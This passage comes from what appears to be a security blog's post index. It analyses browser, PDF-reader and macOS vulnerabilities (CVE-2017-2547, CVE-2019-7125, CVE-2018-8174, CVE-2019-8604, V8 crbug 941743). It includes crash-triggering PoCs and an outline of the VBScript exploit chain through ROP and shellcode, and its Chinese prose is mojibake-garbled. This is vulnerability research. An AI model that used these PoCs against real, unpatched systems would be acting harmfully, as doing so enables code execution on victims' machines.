å¦‚æœå¦‚æœminç»™ä¸ªè´Ÿæ•°ï¼Œé‚£ä¹ˆåé¢çš„è¾¹ç•Œæ£€æŸ¥åªæœ‰å¯¹maxå€¼çš„æ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå¯ä»¥ç»™ä¸€ä¸ªè´Ÿçš„ä¸‹æ ‡ï¼Œä»è€Œé€ æˆè¶Šç•Œè®¿é—®ã€‚ é‚£ä¹ˆPoCå°±å¾ˆå®¹æ˜“çœ‹æ‡‚äº†ï¼Œ è®©jsä»£ç å¤šæ¬¡æ‰§è¡Œï¼Œmake hotè¿›å…¥DFG JITçš„ä¼˜åŒ–æµç¨‹ï¼Œåœ¨è®¿é—®æ•°ç»„æ—¶æ•°ç»„ä¸‹æ ‡ç»™ä¸€ä¸ªè´Ÿæ•°ï¼Œç”±äºæ²¡æœ‰åšè¾¹ç•Œæ£€æŸ¥ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´è¶Šç•Œè¯»ã€‚ 0x03 : Patch Patchä»£ç çš„è¯ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œå¢åŠ äº†minæ˜¯å¦æ˜¯è´Ÿæ•°çš„æ£€æµ‹ï¼Œæ˜¯çš„è¯å°±é€€å‡ºDFGä¼˜åŒ–ï¼Œå›é€€åˆ°æ›´ä½ä¸€å±‚çš„ä¼˜åŒ–ï¼Œå»åšæ›´å¤šçš„æ£€æŸ¥ ï¼šï¼‰ 0x04 : ReferenceDECONSTRUCTING A WINNING WEBKIT PWN2OWN ENTRY source code JavascriptCoreå››å±‚ç»“æ„ js-vuln-db","link":"/2019/04/20/CVE-2017-2547-%E5%88%86%E6%9E%90/"},{"title":"CVE-2019-7125 PoC","text":"InfoFrom Talos :Adobe Acrobat Reader DC text field value remote code execution vulnerability â€” redux PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859%PDF-1.51 0 obj&lt;&lt;/Kids [&lt;&lt; /Annots [&lt;&lt; /Subtype /Text /Rect[0 0 0 0] /Subj (Hello World!) &gt;&gt; &lt;&lt; /Subtype /Text /Rect[0 0 0 0] /Subj (Hello zzzWorld!) &gt;&gt;] /Parent 1 0 R /Contents[3 0 R] &gt;&gt;] /Resources&lt;&lt;&gt;&gt;&gt;&gt;%endobj3 0 obj&lt;&lt;&gt;&gt;streamBT/F1 105 Tf 0 400 Td(Adobe Reader)Tj ETendstreamendobjtrailer&lt;&lt;/Root &lt;&lt; /AcroForm &lt;&lt; /Fields [ &lt;&lt; /Rect[10 10 10 10] /Subtype/Widget /T(mytext) /V(this is a text) /FT/Tx &gt;&gt; ] &gt;&gt; /OpenAction &lt;&lt; /S /JavaScript /JS( var r = new RegExp(Array(32770).join(String.fromCharCode(24))); this.getField('mytext')['value'] = r; ) &gt;&gt; /Pages 1 0 R &gt;&gt;&gt;&gt; ReferenceTALOS-2019-0774","link":"/2019/04/12/CVE-2019-7125-PoC/"},{"title":"CVE-2018-8174 analysis","text":"CVE-2018-8174 Basic Infoåˆ©ç”¨oleåŠ è½½IEçš„0dayå®Œæˆåˆ©ç”¨ã€‚ win7 sp1 x86 vbscript version : 5.8.9600.17420 vuln âœ…poc 12345678910111213141516171819202122232425262728293031323334353637&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;script language=&quot;vbscript&quot;&gt;Dim array_aDim array_b(1)Class Trigger Private Sub Class Terminate() Set array_b(0) = array_a(1) array_a(1) = 1 End SubEnd ClassSub UAF ReDim array_a(1) Set array_a(1) = New Trigger Erase array_aEnd SubSub TriggerVuln array_b(0) = 0End SubSub StartExploit UAF TriggerVulnEnd SubStartExploit&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; çœ‹èµ·æ¥æ˜¯ä¸ªUaFï¼Œç»“åˆpocæ¥çœ‹ï¼š UAFå‡½æ•°é‡ŒRedimäº†array_aï¼Œå¹¶ä¸”æŠŠå®ƒçš„å€¼åˆå§‹åŒ–ä¸ºTriggerå¯¹è±¡çš„ä¸€ä¸ªå®ä¾‹ï¼Œéšåä¾¿åˆ é™¤äº†array_aå¯¹è±¡ array_aè¢«åˆ é™¤çš„æ—¶å€™è§¦å‘äº†Triggerçš„ææ„å‡½æ•°ï¼Œè¿™é‡Œé¢æŠŠarray_a(1)èµ‹å€¼ç»™array_b(0)ï¼Œæ­¤æ—¶array_b(0)æŒ‡å‘Triggerå¯¹è±¡ éšåarray_a(1)=1æ˜¯ä¸ºäº†å¹³è¡¡å¼•ç”¨è®¡æ•°ï¼Œå¥½è·å¾—ä¸€ä¸ªé‡æŒ‡é’ˆ éšåçš„TriggerVulnå‡½æ•°é‡Œarray_b(0)è®¿é—®äº†å·²ç»é‡Šæ”¾çš„Triggerå¯¹è±¡ï¼Œå¯¼è‡´UaFã€‚ è¿™ä¸ªè¿‡ç¨‹å’Œä¹‹å‰çœ‹åˆ°çš„ä¸€äº›vbsçš„æ´å¾ˆåƒï¼Œéƒ½æ˜¯ä¸€ä¸ªæ¨¡å¼ã€‚ é‚£ä¹ˆæ ¹æ®!heap -p -a eaxçš„è°ƒç”¨æ ˆå¯ä»¥çœ‹åˆ°ä¸€ä¸ª!VbsErase+0x00000050å‡½æ•°ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å¯¹åº”pocé‡Œçš„Erase array_aã€‚ è°ƒç”¨æ ˆk10é‡Œçœ‹åˆ°çš„vbscript!AssignVar åº”è¯¥å¯¹åº”array_b(0) = 0èµ‹å€¼è¯­å¥ã€‚ Q:UaFçš„å¯¹è±¡æ˜¯ï¼ŸA:VBScriptClass Q:è¢«é‡Šæ”¾å¯¹è±¡çš„å¤§å°ï¼ŸA:0x30é‡Šæ”¾çš„æ—¶å€™ï¼Œå›è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„VBScriptClass::Releaseå‡½æ•°ï¼Œåœ¨c++å±‚vbsé‡Œçš„Triggerå¯¹è±¡æ˜¯VBScriptClassï¼Œé‡Šæ”¾çš„æ—¶å€™è°ƒç”¨äº†Releaseå‡½æ•°ï¼Œæ‰€ä»¥è¯¥å¯¹è±¡çš„å¤§å°ç­‰ä¿¡æ¯ï¼Œå¯ä»¥è°ƒè¿™ä¸ªå‡½æ•°ã€‚ é‡Šæ”¾å‰å 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657580:007&gt; dd esi01848fd0 6b60206c 00000002 0184cf78 07d29f8801848fe0 00000b64 00000000 00000000 08864efc01848ff0 00000001 0865efe4 00000000 0000000001849000 ???????? ???????? ???????? ????????01849010 ???????? ???????? ???????? ????????01849020 ???????? ???????? ???????? ????????01849030 ???????? ???????? ???????? ????????01849040 ???????? ???????? ???????? ????????0:007&gt; !heap -p -a esi address 01848fd0 found in _DPH_HEAP_ROOT @ 1781000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 8860ea0: 1848fd0 30 - 1848000 2000 vbscript!VBScriptClass::`vftable' 722c8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 77225ede ntdll!RtlDebugAllocateHeap+0x00000030 771ea40a ntdll!RtlpAllocateHeap+0x000000c4 771b5ae0 ntdll!RtlAllocateHeap+0x0000023a 77039d45 msvcrt!malloc+0x0000008d 7703b0d7 msvcrt!operator new+0x0000001d 6b629f0c vbscript!VBScriptClass::Create+0x00000014 6b629e97 vbscript!CScriptRuntime::RunNoEH+0x00002c78 6b60526e vbscript!CScriptRuntime::Run+0x000000c3 6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b 6b62a12e vbscript!CScriptRuntime::RunNoEH+0x00002c23 6b60526e vbscript!CScriptRuntime::Run+0x000000c3 6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b 6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74 6b60526e vbscript!CScriptRuntime::Run+0x000000c3 6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b 6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74 6b60526e vbscript!CScriptRuntime::Run+0x000000c3 6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b 6b6059bd vbscript!CSession::Execute+0x00000156 6b605c6b vbscript!COleScript::ExecutePendingScripts+0x0000014f 6b629138 vbscript!COleScript::ParseScriptTextCore+0x0000023e 6b60c3b9 vbscript!COleScript::ParseScriptText+0x00000029 6496f1e5 MSHTML!CActiveScriptHolder::ParseScriptText+0x00000051 64a05f3a MSHTML!CScriptCollection::ParseScriptText+0x00000177 6496fd65 MSHTML!CScriptData::CommitCode+0x00000332 6496f973 MSHTML!CScriptData::Execute+0x00000286 649707d4 MSHTML!CHtmScriptParseCtx::Execute+0x00000130 649e9a52 MSHTML!CHtmParseBase::Execute+0x00000196 6476b333 MSHTML!CHtmPost::Broadcast+0x00000153 6476b0ef MSHTML!CHtmPost::Exec+0x000005d9 64a078c8 MSHTML!CHtmPost::Run+0x0000003d 0:007&gt; g(b4c.b64): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=01848fd0 ebx=72540fd0 ecx=00000009 edx=00000009 esi=08658fe0 edi=00000009eip=759e4971 esp=0479b7f0 ebp=0479b7f8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202OLEAUT32!VariantClear+0xb3:759e4971 8b08 mov ecx,dword ptr [eax] ds:0023:01848fd0=???????? exploit analysisåˆ©ç”¨ï¼Œæ‰¾åˆé€‚çš„å¯¹è±¡å ä½ï¼Œå¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªVBScriptClasså¯¹è±¡æ¥å ä½ï¼Œæ„é€ ç±»å‹æ··æ·†å»åˆ©ç”¨ã€‚ è¿™ä¸ªå¯¹è±¡çš„ç»“æ„: 123401848fd0 6b60206c 00000002 0184cf78 07d29f88 vtable refcnt NameTbl01848fe0 00000b64 00000000 00000000 08864efc01848ff0 00000001 0865efe4 00000000 00000000 NameTblå¯¹è±¡ä¿å­˜çš„æ˜¯è¿™ä¸ªå¯¹è±¡çš„ æˆå‘˜å˜é‡å’Œæ–¹æ³•ï¼Œè¿™ä¸ªå¯¹è±¡å¯ä»¥è¢«ç”¨æ¥åšåˆ©ç”¨ï¼Œé‡ç‚¹å…³æ³¨ã€‚ è¿™ä¸ªå¯¹è±¡å¤§å° 0x88ï¼ŒNameTblå¯¹è±¡ä»+0Ã—48å¼€å§‹ä¿å­˜æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°çš„æŒ‡é’ˆ 123456789101112131415161718192021NameList *__thiscall NameList::NameList(int this){ NameList *result; // eax *(_DWORD *)(this + 12) = 256; *(_DWORD *)this = 0; *(_DWORD *)(this + 4) = 0; *(_DWORD *)(this + 8) = 0; *(_DWORD *)(this + 16) = 0x4000; *(_DWORD *)(this + 52) = this + 56; *(_DWORD *)(this + 44) = 0; *(_DWORD *)(this + 48) = 20; *(_DWORD *)(this + 20) = 0; *(_DWORD *)(this + 24) = this + 20; result = (NameList *)this; *(_DWORD *)(this + 32) = 15; *(_DWORD *)(this + 28) = 0; *(_DWORD *)(this + 36) = 0; *(_DWORD *)(this + 40) = 64; return result;} UAFå‡½æ•° âœ…ä¸¤æ¬¡0-6çš„å¾ªç¯ä¹‹åï¼ŒUafArrayA å’Œ UafArrayBé‡Œé¢çš„7ä¸ªå…ƒç´ éƒ½æŒ‡å‘äº†é‡Šæ”¾çš„ ClassTerminateA/Bå¯¹è±¡ã€‚ã€‚éšåç«‹å³ç”¨ ReuseClasså¯¹è±¡å ä½ï¼Œæ­¤æ—¶7ä¸ªå¼•ç”¨éƒ½æŒ‡å‘è¿™ä¸ªæ–°çš„ReuseClassã€‚ã€‚ã€‚ ClassTerminateAé‡Šæ”¾çš„æ—¶å€™: 1234567890:007&gt; dd 06776fd0 06776fd0 69a8206c 00000000 067cff78 07ebdf8806776fe0 000009c4 00000000 00000000 067d3efc06776ff0 00000000 07384fc4 00000000 067b0fd006777000 ???????? ???????? ???????? ????????06777010 ???????? ???????? ???????? ????????06777020 ???????? ???????? ???????? ????????06777030 ???????? ???????? ???????? ????????06777040 ???????? ???????? ???????? ???????? è°ƒè¯•å‘ç°å¹¶æ²¡æœ‰å ä½æˆåŠŸï¼Œéœ€è¦è°ƒæ•´expçš„å ä½éƒ¨åˆ†ã€‚ åº”è¯¥æ˜¯æœ‰ç¢ç‰‡ï¼Œæ‰€ä»¥ClassTerminateAåˆ›å»ºåˆé‡Šæ”¾çš„æ—¶å€™æ²¡æœ‰ç”¨åŒä¸€å—å†…å­˜â€¦ åé¢å‘ç°æ˜¯pageheapçš„é—®é¢˜ï¼Œä¸èƒ½å¼€pageheapã€‚ TypeConfusionå‡½æ•° âœ…resueObjectA_arrå’ŒresueObjectA_int setPropç»™æˆå‘˜memèµ‹å€¼ã€‚ã€‚èµ‹å€¼æˆReplacingClass_Arrayå’ŒReplacingClass_Int è‡ªåŠ¨è§¦å‘äº†getterå›è°ƒã€‚ã€‚ã€‚ ä¸¤ä¸ªGetterå›è°ƒé‡Œåšçš„äº‹å·®ä¸å¤šï¼Œ 1234567891011121314Class ReplacingClass_ArrayPublic Default Property Get Q Dim objectImitatingArray Q=CDbl(&quot;174088534690791e-324&quot;) ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0 For idx=0 To 6 UafArrayA(idx)=0 Next Set objectImitatingArray=New FakeReuseClass objectImitatingArray.mem = FakeArrayString For idx=0 To 6 Set UafArrayA(idx)=objectImitatingArray NextEnd PropertyEnd Class ReuseClass.mem èµ‹å€¼ä¸º CDbl(&quot;174088534690791e-324&quot;) éšåé‡Šæ”¾äº†åŸæœ¬UafArrayAæŒ‡å‘çš„å†…å­˜ï¼Œéšååˆ©ç”¨Set objectImitatingArray=New FakeReuseClasså»å ä½ï¼Œé‡æ–°è·å–åˆ°åŸæœ¬å¯¹è±¡çš„å†…å­˜ï¼Œæ­¤æ—¶å°±å¯ä»¥æŠŠ ReuseClassæ··æ·†æˆäº†FakeReuseClasså¯¹è±¡ã€‚ä¹‹å objectImitatingArray.mem çš„èµ‹å€¼åˆ©ç”¨é”™ä½è¦†ç›–ï¼Œä¼ªé€ å‡ºäº†ä¸€ä¸ªArrayå¯¹è±¡ã€‚ é‡ç‚¹è°ƒè¯•ä¸‹è¿™ä¸ªæ··æ·†çš„è¿‡ç¨‹ï¼š ä¸¤ä¸ªåœ°å€åˆ†åˆ«æ˜¯1e7c720å’Œ1e82fa8 12345678910110:002&gt; dd 1e7c758 L401e7c758 6b7e206c 00000007 01e7da70 01e79ef80:002&gt; dd 01e7da70 + 0x34 L401e7daa4 01e7daa8 01e81984 01e819b8 01e819f80:002&gt; du 01e81984 +3001e819b4 &quot;p&quot;0:002&gt; du 01e819b8 +3001e819e8 &quot;SetProp&quot;0:002&gt; du 01e819f8+3001e81a28 &quot;mem&quot; ç±»å‹æ··æ·†å‰ 120:005&gt; dd 01e819f8 L401e819f8 00000000 00500053 00000050 00000000 æ··æ·†ä¹‹å 120:005&gt; dd 01e819f8 L401e819f8 00000005 00000000 00000000 0000200c å€Ÿç”¨åˆ«äººåˆ†æé‡Œçš„ä¸€ä¸ªå›¾ è¿™é‡Œçš„å†™æ˜¯ åœ¨ç±»å‹æ··æ·†çš„åŸºç¡€ä¸Šï¼Œé”™ä½ä¿®æ”¹äº†æˆå‘˜ç±»å‹ã€‚ (å°†VARIANTç±»å‹ä»Stringè¦†ç›–ä¸ºArray) è·å¾—äº†ä¸€ä¸ª 0x7fffffff é•¿çš„arrayç”¨äºè¯»å†™å†…å­˜ã€‚ AAR/AAW âœ…ä¼ªé€ çš„ä¸¤ä¸ªå¯¹è±¡(+8)å¤„çš„NameListå¯¹è±¡æ˜¯è¿ç»­åˆ†é…çš„ 1234567// ç¬¬ä¸€ä¸ª0:018&gt; dd 01bce438 L401bce438 01bd2348 000000ac 00000100 00000100// ç¬¬äºŒä¸ª0:018&gt; dd 01bce558 L401bce558 01bd2578 000000ac 00000100 00000100 æˆå‘˜ä¹Ÿæ˜¯è¿ç»­åˆ†é…çš„ï¼Œ 12340:018&gt; dd 01bce438 +0x34 L401bce46c 01bce470 01bd234c 01bd2380 01bd23c00:018&gt; dd 01bce558 +0x34 L401bce58c 01bce590 01bd257c 01bd25b0 01bd25f0 æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡ä¸ºé€ æˆäº†ä¸€ä¸ª0x7fffffffé•¿åº¦çš„arrayï¼Œ ä¼ªé€ çš„intå¯¹è±¡çš„memæˆå‘˜åœ¨fakearrayçš„èŒƒå›´é‡Œï¼Œæ‰€ä»¥int.memæ˜¯ä¸€ä¸ªfakearrayé‡Œçš„åœ°å€ï¼ŒæŒ‡å‘ç‰¹å®šçš„å…ƒç´ ï¼Œé‚£ä¹ˆåªè¦ä½¿ç”¨fakearray[int.mem]å°±å¯ä»¥ä»»æ„åœ°å€è¯»å†™ã€‚ ä¸‹é¢æ˜¯æ‰‹å†™çš„è®°å½• RCE âœ…å†™ROP+shellcodeåˆ°å¯æ§çš„æ•°ç»„ä¸­ï¼Œè§¦å‘æ‰§è¡Œï¼Œropä¿®æ”¹å†…å­˜å±æ€§å¹¶è·³åˆ°shellcodeå»æ‰§è¡Œã€‚ 12345Sub TriggerCodeExecution resueObjectA_arr.mem(some_memory)=&amp;h4d Wscript.Echo(&quot;GO&quot;) resueObjectA_arr.mem(some_memory+8)=0End Sub è§¦å‘çš„æ—¶å€™ï¼ŒæŠŠè¿™ä¸ªå…ƒç´ çš„VARIANTç±»å‹ä¿®æ”¹ä¸º0x4dï¼ŒéšåmemClassA.mem(address + 8) = 0è§¦å‘äº†AssignVarå‡½æ•°ã€‚ ä»£ç æµå°†æŒ‰ç›¸åº”å¤§å°è·³è½¬åˆ°ä¸€ä¸ªâ€œå‡½æ•°æŒ‡é’ˆæ•°ç»„â€çš„ç»“æ„ã€‚å½“ç±»å‹ä¸º0x4dï¼Œå°†VARIANTä¸­çš„å€¼åŸŸå‹æ ˆä¿å­˜ï¼Œå¹¶å°†è¯¥å€¼åŸŸè§£ææˆvfTableï¼Œéšåå‘ç”Ÿè°ƒç”¨ï¼Œå¯ä»¥æˆåŠŸåŠ«æŒeipã€‚ 1234NTSYSAPI NTSTATUS NTAPI ZwContinue ( IN PCONTEXT Context; IN BOOLEAN TestAlert); è¿™ä¸ªå‡½æ•°è°ƒç”¨æ—¶contextå‚æ•°å¯æ§ï¼Œæ‰€ä»¥å¯ä»¥åŠ«æŒæµç¨‹ï¼Œè·³è½¬åˆ°rop+shellcodeé‡Œã€‚ è¿™ç§åšæ³•å¯ä»¥bypass CFG å‚è€ƒexp from github [åŸåˆ›]â€œæ·±å…¥â€æ¢ç´¢CVE-2018-8174","link":"/2020/02/20/CVE-2018-8174-analysis/"},{"title":"CVE-2019-8604 analysis","text":"info1234567Available for: macOS Sierra 10.12.6, macOS High Sierra 10.13.6, macOS Mojave 10.14.4Impact: An application may be able to execute arbitrary code with system privilegesDescription: A memory corruption issue was addressed with improved memory handling.CVE-2019-8604: Fluoroacetate working with Trend Micro's Zero Day Initiative zdiçš„æè¿°: 123This vulnerability allows remote attackers to escape the sandbox on affected installations of Apple Safari. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.The specific flaw exists within the securityd service. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a heap-based buffer. An attacker can leverage this in conjunction with other vulnerabilities to execute code under the context of the current user. è¿˜æ˜¯zdiçš„æè¿°è¯¦ç»†ï¼Œè‹¹æœçš„æè¿°çœŸçš„æ˜¯ä¸æ€ä¹ˆå¯ä¿¡ã€‚ vulnä¸¤ç§æ‰¾åˆ°è¿™ä¸ªæ´çš„æ–¹å¼ï¼Œé diffæˆ–è€…æ²¿ç€è¿™ä¸ªæè¿°å°è¯•æŒ–ã€‚ æˆ‘é¦–å…ˆè¯•äº†è¯•diffï¼Œå› ä¸ºæˆ‘ç”¨çš„æ˜¯ 10.14.3å’Œ10.14.6ï¼Œå˜åŒ–æœ‰ç‚¹å¤§ï¼ŒdiffçœŸçš„ä¸å¥½ä½¿ã€‚ æ‰€ä»¥æˆ‘é€‰æ‹©äº†ç¬¬äºŒç§æ–¹å¼ã€‚ æ—¢ç„¶æ˜¯ç›´æ¥è·å–äº†é•¿åº¦å¹¶ä½¿ç”¨ï¼Œé‚£å°±å…ˆç¡®å®šè¯¥æœåŠ¡ä½¿ç”¨çš„ipcæ–¹å¼ï¼Œç„¶åæ‰¾è·å–æ•°æ®çš„å‡½æ•°çš„xrefï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œæ²¡ä¸€ä¼šå„¿å°±èƒ½çœ‹åˆ°è¿™ä¸ªå¯ç–‘çš„åœ°æ–¹äº†ï¼š 10.14.3 1234567891011121314151617181920212223242526272829303132333435363738394041char __fastcall sub_100053185(__int64 a1, __int64 a2, __int64 a3){ __int64 v3; // rbx __int64 v4; // r15 const void *source; // r13 size_t length; // r14 void *v7; // r12 size_t v8; // r14 unsigned int v9; // eax char result; // al size_t v11; // [rsp+10h] [rbp-80h] char v12; // [rsp+18h] [rbp-78h] __int64 v13; // [rsp+60h] [rbp-30h] v3 = a3; v4 = xpc_dictionary_get_string(a3, &quot;_item_name&quot;); source = (const void *)xpc_dictionary_get_data(v3, &quot;_item_value&quot;, &amp;v11); if ( xpc_dictionary_get_value(v3, &quot;_item_sensitive_value_length&quot;) ) { length = xpc_dictionary_get_uint64(v3, &quot;_item_sensitive_value_length&quot;); v7 = malloc(length); memcpy(v7, source, length); memset_s(source, v11, 0LL, length); v11 = length; } else { v8 = v11; v7 = malloc(v11); memcpy(v7, source, v8); } v9 = xpc_dictionary_get_uint64(v3, &quot;_item_flags&quot;); sub_100005588(&amp;v12, v4, (unsigned int)v11, v7, v9); sub_1000532D4(*(_QWORD *)(a1 + 32), &amp;v12, &amp;v12); free(v7); sub_10005222C(&amp;v12); result = __stack_chk_guard; if ( __stack_chk_guard == v13 ) result = 1; return result;} copyçš„lengthå¯æ§ï¼Œdstæ˜¯æ ¹æ®ç”¨æˆ·çš„lengthåˆ†é…çš„ï¼Œä½†æ˜¯sourceä¸ä¸€å®šæœ‰é‚£ä¹ˆå¤§ï¼Œlengthåˆæ²¡æœ‰checkï¼Œæ‰€ä»¥å°±è¶Šç•Œè¯»äº†ã€‚ patch by diff10.14.6 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364char __fastcall sub_10004405C(__int64 a1, __int64 a2, __int64 a3){ __int64 v3; // rbx __int64 v4; // r15 __int64 v5; // r12 const void *v6; // r13 unsigned __int64 length; // rax size_t v8; // r14 size_t v9; // r15 __int64 v10; // rbx size_t v11; // r14 void *v12; // r12 unsigned int v13; // eax char result; // al __int64 v15; // [rsp+10h] [rbp-90h] size_t data_length; // [rsp+18h] [rbp-88h] int v17; // [rsp+20h] [rbp-80h] size_t v18; // [rsp+24h] [rbp-7Ch] __int64 v19; // [rsp+70h] [rbp-30h] v3 = a3; v4 = a1; v5 = xpc_dictionary_get_string(a3, &quot;_item_name&quot;); v6 = (const void *)xpc_dictionary_get_data(v3, &quot;_item_value&quot;, &amp;data_length); if ( !xpc_dictionary_get_value(v3, &quot;_item_sensitive_value_length&quot;) ) { v15 = v5; v11 = data_length; v12 = malloc(data_length); memcpy(v12, v6, v11);LABEL_7: v13 = xpc_dictionary_get_uint64(v3, &quot;_item_flags&quot;); sub_1000045A2(&amp;v17, v15, (unsigned int)data_length, v12, v13); sub_10004422A(*(_QWORD *)(v4 + 32), &amp;v17, &amp;v17); free(v12); sub_10004306E(&amp;v17); goto LABEL_8; } length = xpc_dictionary_get_uint64(v3, &quot;_item_sensitive_value_length&quot;); v8 = length; v9 = data_length; if ( length &lt;= data_length ) // add length check { v15 = v5; v12 = malloc(length); memcpy(v12, v6, v8); memset_s(v6, v9, 0LL, v8); data_length = v8; v4 = a1; goto LABEL_7; } v10 = sub_100093B1E(&quot;SecurityAgentXPCQuery&quot;); if ( (unsigned __int8)os_log_type_enabled(v10, 0LL) ) { v17 = 134217984; v18 = v8; _os_log_impl(&amp;_mh_execute_header, v10, 0LL, aSensitiveDataL, &amp;v17, 12LL); }LABEL_8: result = __stack_chk_guard; if ( __stack_chk_guard == v19 ) result = 1; return result;} å–äº†è¦copyçš„dataçš„é•¿åº¦ï¼Œå¹¶ä¸”æ£€æŸ¥äº†ç”¨æˆ·ä¼ é€’æ¥çš„sizeæ˜¯ä¸æ˜¯å°äºç­‰äºè¿™ä¸ªå€¼ï¼Œä¹‹åå†æ‹·è´ã€‚ refZDI-19-766","link":"/2019/09/02/CVE-2019-8604-analysis/"},{"title":"Chrome M73 issue 941743","text":"1. bug infoè¿™æ˜¯ç§‘æ©å®éªŒå®¤19å¹´ blackhat USAè®®é¢˜ä¸­é‚£å¥—åˆ©ç”¨çš„rceéƒ¨åˆ†ï¼Œv8 JITä¼˜åŒ–çš„æ¼æ´ã€‚ ç±»å‹æ··æ·†æ¼æ´ã€‚ 123456789101112131415161718192021222324âœ ~ ~/v8/v8/out/x64.debug/d8 ~/chrome_M73_crbug941743_RCE/raw_poc.js ## Fatal error in ../../src/elements.cc, line 881# Debug check failed: IsFastElementsKind(from_kind).####FailureMessage Object: 0x7fff3b6caa70==== C stack trace =============================== /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f95be106e1e] /home/jack/v8/v8/out/x64.debug/libv8_libplatform.so(+0x2d527) [0x7f95be0ac527] /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f95be0f4fb8] /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(+0x349fc) [0x7f95be0f49fc] /home/jack/v8/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x32) [0x7f95be0f5092] /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1585f80) [0x7f95bcf27f80] /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1582a31) [0x7f95bcf24a31] /home/jack/v8/v8/out/x64.debug/libv8.so(+0x1a8b5b8) [0x7f95bd42d5b8] /home/jack/v8/v8/out/x64.debug/libv8.so(v8::internal::Runtime_TransitionElementsKind(int, unsigned long*, v8::internal::Isolate*)+0x117) [0x7f95bd42d247] /home/jack/v8/v8/out/x64.debug/libv8.so(+0x212bd00) [0x7f95bdacdd00]Received signal 4 ILL_ILLOPN 7f95be104581[1] 8542 illegal hardware instruction (core dumped) ~/v8/v8/out/x64.debug/d8 ~/chrome_M73_crbug941743_RCE/raw_poc.js 2. poc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// Impact version: 6.1.462+ var arr = [1];for (var i = 1; i &lt; 300; ++i) { var a2 = arr.map(function (v, i) { arr.push(1); }); arr.some(arr.constructor); for (var j = 0; j &lt; 1000000; ++j) {}}``` 1. array.map æ–¹æ³•ï¼Œå¯¹arrayä¸­æ¯ä¸ªå…ƒç´ æ‰§è¡Œå‚æ•°æŒ‡å®šçš„æ“ä½œï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–°çš„æ•°æ®2. array.some æ–¹æ³•ï¼Œæ˜¯ä¸€ä¸ªæ£€æµ‹![]( https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15904645923418.jpg)è¿™ä¸ªpatchåœ¨è¿™ä¸ªæ¼æ´ä¿®è¡¥çš„commité‡Œæ˜¯æœ‰çš„ï¼Œå°±è¿™ä¸ªpocï¼š```javascript// Copyright 2019 the V8 project authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.// Flags: --allow-natives-syntax --noenable-slow-asserts// This call ensures that TurboFan won't inline array constructors.Array(2**30);// Set up a fast holey smi array, and generate optimized code.let a = [1, 2, ,,, 3];function mapping(a) { return a.map(v =&gt; v);}mapping(a);mapping(a);%OptimizeFunctionOnNextCall(mapping);mapping(a);// Now lengthen the array, but ensure that it points to a non-dictionary// backing store.a.length = (32 * 1024 * 1024)-1;a.fill(1,0);a.push(2);a.length += 500;// Now, the non-inlined array constructor should produce an array with// dictionary elements: causing a crash.mapping(a); 3. bug analysisä½œè€…çš„åˆ†æ: The optimization of JSCreateArray (for |a2|) bailout at typed lowering phase. When executing JITed code, it calls to |Runtime_NewArray|. Thereâ€™s a CheckMaps for |arr|, but it canâ€™t ensure an array that produced by |arr| is the same type. For example, |arr| is extended by |push| and it has PACKED_SMI_ELEMENTS, but |a2| could be constructed by |Runtime_NewArray| and it could have DICTIONARY_ELEMENTS. TransitionAndStoreElement assumes the source array should be HOLEY_SMI_ELEMENTS, this canâ€™t ensure either. Because when calling to |Runtime_NewArray| and arrayâ€™s actual length &gt;= 0x4000000, thereâ€™ll be a dictionary elements array. So our bug occurs. issue-941743-cve-2019-5825 ä¸ºä»€ä¹ˆå¼€å§‹éœ€è¦ä¸€ä¸ª Array(2 ** 30) 12345678910111213141516171819if (argv.length() == 1) { Handle&lt;Object&gt; argument_one = argv.at&lt;Object&gt;(0); if (argument_one-&gt;IsSmi()) { int value = Handle&lt;Smi&gt;::cast(argument_one)-&gt;value(); if (value &lt; 0 || JSArray::SetLengthWouldNormalize(isolate-&gt;heap(), value)) { // the array is a dictionary in this case. can_use_type_feedback = false; } else if (value != 0) { holey = true; if (value &gt;= JSArray::kInitialMaxFastElementArray) { can_inline_array_constructor = false; } } } else { // Non-smi length argument produces a dictionary 